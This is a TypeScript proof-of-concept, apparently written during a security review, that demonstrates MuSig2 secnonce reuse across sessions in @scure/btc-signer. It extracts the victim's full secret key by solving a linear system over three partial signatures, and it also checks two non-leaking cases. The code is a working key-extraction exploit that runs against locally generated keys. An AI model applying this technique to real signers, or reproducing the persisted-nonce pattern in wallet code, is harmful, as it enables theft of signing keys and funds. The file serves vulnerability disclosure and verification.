/**
 * PoC: MuSig2 secnonce reuse across sessions -> full secret-key extraction.
 *
 * Target: @scure/btc-signer 2.2.0, src/musig2.ts @ 68b2fad4ef8232302c6239c00902def1f511c974
 *
 * Scenario (realistic caller flow the library contract invites):
 *  - Victim is a stateful signer: nonceGen in round 1, PERSISTS the 97-byte secnonce
 *    (DB/JSON/structuredClone) until the coordinator delivers the aggnonce in round 2.
 *  - Session.sign() zeroes only the Uint8Array instance it is handed (musig2.ts:615).
 *    The persisted copy still holds k1||k2.
 *  - The coordinator (attacker) restarts/aborts the session and runs it again with new
 *    messages/nonces. The victim reloads the persisted secnonce and signs again.
 *  - After 3 partial signatures with the same (k1,k2), solve a 3x3 linear system mod n:
 *      s_j = k1 + b_j*k2 + e_j*a*d  (mod n), j=1..3  ->  k1, k2, d  ->  victim secret key.
 *
 * All keys are generated locally; nothing leaves this machine.
 */
// Dependencies are resolved from the reviewed worktree (see README.md in this dir).
const WORKTREE =
  process.env.SCURE_WORKTREE ||
  '<workspace>/samples/scure-btc-signer/runs/20260805T010454Z-inner-subagent-3-44bd8f48/worktree-subagent-3-44bd8f48';
const { schnorr, secp256k1 } = await import(
  WORKTREE + '/node_modules/@noble/curves/secp256k1.js'
);
const musig2 = await import(WORKTREE + '/src/musig2.ts');

const Point = secp256k1.Point;
const Fn = Point.Fn;
const ORDER = Fn.ORDER;
const hx = (u: Uint8Array) => Buffer.from(u).toString('hex');
const eq = (a: Uint8Array, b: Uint8Array) => hx(a) === hx(b);

// --- mod-n 3x3 solve ------------------------------------------------------------
function solve3(M: bigint[][], v: bigint[]): bigint[] {
  // Gaussian elimination over Z_n
  const A = M.map((row, i) => [...row, v[i]]);
  for (let col = 0; col < 3; col++) {
    let piv = col;
    while (A[piv][col] === 0n) piv++;
    [A[col], A[piv]] = [A[piv], A[col]];
    const inv = Fn.inv(A[col][col]);
    A[col] = A[col].map((x) => Fn.mul(x, inv));
    for (let r = 0; r < 3; r++) {
      if (r === col) continue;
      const f = A[r][col];
      A[r] = A[r].map((x, c) => Fn.sub(x, Fn.mul(f, A[col][c])));
    }
  }
  return [A[0][3], A[1][3], A[2][3]];
}

// --- participants -----------------------------------------------------------------
const victimSk = schnorr.utils.randomSecretKey();
const attackerSk = schnorr.utils.randomSecretKey();
const victimPk = musig2.IndividualPubkey(victimSk);
const attackerPk = musig2.IndividualPubkey(attackerSk);
const pubkeys = musig2.sortKeys([victimPk, attackerPk]); // canonical order
const aggCtx = musig2.keyAggregate(pubkeys);
const aggpk = musig2.keyAggExport(aggCtx);

// Victim round 1: generates ONE nonce pair and "persists" the secnonce (e.g. JSON/DB).
const victimNonce = musig2.nonceGen(victimPk, victimSk, aggpk);
const persistedSecnonce: Uint8Array = structuredClone(victimNonce.secret); // survives zeroization!

// Attacker runs THREE sessions (e.g. abort/retry with a fresh message each time).
const sessions: any[] = [];
const psigs: Uint8Array[] = [];
const coeffs: { b: bigint; e: bigint; a: bigint; ggacc: bigint; Rpar: boolean }[] = [];
for (let j = 0; j < 3; j++) {
  const msg = new Uint8Array(32);
  msg[31] = j + 1; // three distinct 32-byte messages
  const attackerNonce = musig2.nonceGen(attackerPk, attackerSk, aggpk, msg);
  const orderedNonces =
    hx(pubkeys[0]) === hx(victimPk)
      ? [victimNonce.public, attackerNonce.public]
      : [attackerNonce.public, victimNonce.public];
  const aggNonce = musig2.nonceAggregate(orderedNonces);
  const session: any = new musig2.Session(aggNonce, pubkeys, msg);
  // Victim reloads the PERSISTED secnonce copy and signs (j-th reuse).
  const psig = session.sign(structuredClone(persistedSecnonce), victimSk);
  psigs.push(psig);
  // Attacker-side bookkeeping (all public values):
  const a = session.getSessionKeyAggCoeff(Point.fromBytes(victimPk));
  const ggacc = Fn.mul(session.Q.y % 2n === 0n ? 1n : ORDER - 1n, session.gAcc); // g*gacc
  coeffs.push({ b: session.b, e: session.e, a, ggacc, Rpar: session.R.y % 2n === 0n });
  sessions.push(session);
}

// --- extraction ---------------------------------------------------------------------
// sign() parity-adjusts the nonce limbs per session: k_i = k_i' if has_even_y(R) else
// n - k_i'. R is public, so the attacker folds the known sign p_j into the equations:
//   s_j = p_j*k1' + p_j*b_j*k2' + e_j*a*d  (mod n)   -> unknowns k1', k2', d (a is public)
const M = coeffs.map((c) => {
  const p = c.Rpar ? 1n : ORDER - 1n;
  return [p, Fn.mul(p, c.b), Fn.mul(c.e, c.a)];
});
const v = psigs.map((p) => Fn.fromBytes(p, true));
const [k1, k2, d] = solve3(M, v);
// d = g*gacc*d'  ->  d' = d * (g*gacc)^-1
const extractedSk = Fn.mul(d, Fn.inv(coeffs[0].ggacc));
const extractedBytes = Fn.toBytes(extractedSk);

console.log('== MuSig2 secnonce reuse -> key extraction ==');
console.log('victim secret key    :', hx(victimSk));
console.log('extracted secret key :', hx(extractedBytes));
console.log('MATCH                :', eq(extractedBytes, victimSk));
console.log(
  'sanity: extracted key reproduces victim pubkey:',
  eq(musig2.IndividualPubkey(extractedBytes), victimPk)
);
// Attacker can now forge: sign a new message as the victim in any future session.
console.log('recovered k1,k2 match persisted secnonce limbs:',
  eq(Fn.toBytes(k1), persistedSecnonce.slice(0, 32)) &&
    eq(Fn.toBytes(k2), persistedSecnonce.slice(32, 64)));

// --- negative evidence ---------------------------------------------------------------
console.log('\n== negative evidence ==');
// (a) Reusing the SAME buffer instance fails fast: zeroized limbs fail scalar decode.
const once = musig2.nonceGen(victimPk, victimSk, aggpk);
const s1 = new musig2.Session(
  musig2.nonceAggregate([
    ...(hx(pubkeys[0]) === hx(victimPk)
      ? [once.public, musig2.nonceGen(attackerPk, attackerSk, aggpk).public]
      : [musig2.nonceGen(attackerPk, attackerSk, aggpk).public, once.public]),
  ]),
  pubkeys,
  new Uint8Array(32)
);
s1.sign(once.secret, victimSk); // zeroes once.secret[0:64] in place
let threw = false;
try {
  s1.sign(once.secret, victimSk);
} catch (e: any) {
  threw = true;
  console.log('(a) second sign with same zeroized buffer throws:', e.constructor.name);
}
console.log('(a) zeroization visible: first 64 bytes all zero:',
  once.secret.slice(0, 64).every((b) => b === 0), '| pk bytes 64..97 intact:',
  !once.secret.slice(64).every((b) => b === 0));

// (b) Reusing a copy in the SAME session (same b,e) yields an IDENTICAL psig: no new
//     equation, no key material. The leak needs >=3 sessions with distinct (b,e).
const msgX = new Uint8Array(32).fill(9);
const aNonce = musig2.nonceGen(attackerPk, attackerSk, aggpk, msgX);
const vNonce = musig2.nonceGen(victimPk, victimSk, aggpk, msgX);
const ordered =
  hx(pubkeys[0]) === hx(victimPk) ? [vNonce.public, aNonce.public] : [aNonce.public, vNonce.public];
const sX = new musig2.Session(musig2.nonceAggregate(ordered), pubkeys, msgX);
const p1 = sX.sign(structuredClone(vNonce.secret), victimSk);
const p2 = sX.sign(structuredClone(vNonce.secret), victimSk); // copy reuse, same session
console.log('(b) same-session copy reuse -> identical psig (no new info):', eq(p1, p2));

if (!eq(extractedBytes, victimSk) || !threw || !eq(p1, p2)) {
  console.error('POC FAILED');
  process.exit(1);
}
console.log('\nPOC OK: key extraction demonstrated; fail-fast and same-session no-leak confirmed.');
